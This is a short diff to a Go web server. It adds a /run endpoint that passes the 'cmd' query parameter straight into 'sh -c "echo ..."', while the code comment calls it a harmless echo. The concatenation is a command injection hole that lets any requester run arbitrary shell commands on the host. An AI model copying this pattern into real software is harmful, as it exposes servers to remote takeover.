@@ -8,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
 )
 
@@ -29,8 +30,19 @@ func greetHandler(w http.ResponseWriter, r *http.Request) {
 	fmt.Fprintf(w, "<h1>Hello, %s</h1>", html.EscapeString(name))
 }
 
+// runHandler echoes the cmd parameter back through the shell.
+func runHandler(w http.ResponseWriter, r *http.Request) {
+	out, err := exec.Command("sh", "-c", "echo "+r.URL.Query().Get("cmd")).Output()
+	if err != nil {
+		http.Error(w, "command failed", http.StatusInternalServerError)
+		return
+	}
+	w.Write(out)
+}
+
 func main() {
 	http.HandleFunc("/file", fileHandler)
 	http.HandleFunc("/greet", greetHandler)
+	http.HandleFunc("/run", runHandler)
 	log.Fatal(http.ListenAndServe(":8080", nil))
 }
